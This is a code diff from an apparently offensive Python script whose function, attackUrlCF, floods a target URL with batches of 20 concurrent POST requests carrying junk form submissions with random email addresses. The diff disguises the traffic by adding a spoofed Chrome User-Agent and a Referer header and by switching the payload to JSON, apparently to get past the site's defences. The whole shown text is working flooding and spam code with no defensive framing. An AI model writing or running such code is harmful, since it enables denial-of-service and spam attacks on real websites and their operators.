@@ -99,17 +99,18 @@ def attackUrlCF(baseUrl, threadNumber):
 			data = {"country":"NL","firstname":"asdasd","lastname":"asdasd","email": ''.join(random.choice(letters) for i in range(10)) + "@asd.com","telephone":"111111111"}
 
 			headers={
-			# 'User-Agent': userAgent,
+			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
 			'Accept-Language': 'en-US,en;q=0.9',
 			'Accept-Encoding': 'gzip, deflate',
 			# 'Cookie': cookiesStr,
+			'Referer': baseUrl,
 			'Connection': 'keep-alive',
 			'Upgrade-Insecure-Requests': '1',
 			}
 
 			requestsArr = []
 			for x in range(20):
-				requestsArr.append(grequests.post(url, headers=headers, data=data))
+				requestsArr.append(grequests.post(url, headers=headers, json=data))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			print(res)
